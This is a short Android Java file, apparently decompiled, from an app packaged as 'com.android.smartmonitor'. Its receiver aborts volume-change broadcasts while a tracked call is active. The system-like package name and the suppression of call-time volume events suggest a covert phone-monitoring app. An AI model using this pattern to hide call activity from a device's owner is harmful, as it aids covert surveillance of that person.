package com.android.smartmonitor.receiver;

import com.android.smartmonitor.control.CheckCall;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class CheckVolumeReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context paramContext, Intent paramIntent) {
		if (CheckCall.getMyCallState())
			abortBroadcast();
		
		//System.out.println("volumeChange");
	}
}